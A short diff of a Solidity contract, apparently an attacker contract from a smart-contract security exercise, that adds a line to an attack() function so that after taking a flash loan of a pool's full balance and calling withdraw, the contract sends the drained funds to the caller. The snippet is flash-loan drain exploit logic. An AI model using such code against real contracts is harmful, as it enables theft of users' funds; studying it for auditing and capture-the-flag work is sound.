@@ -8,5 +8,6 @@
     function attack() external {
         pool.flashLoan(address(pool).balance);
         pool.withdraw();
+        payable(msg.sender).transfer(address(this).balance);
     }
  }
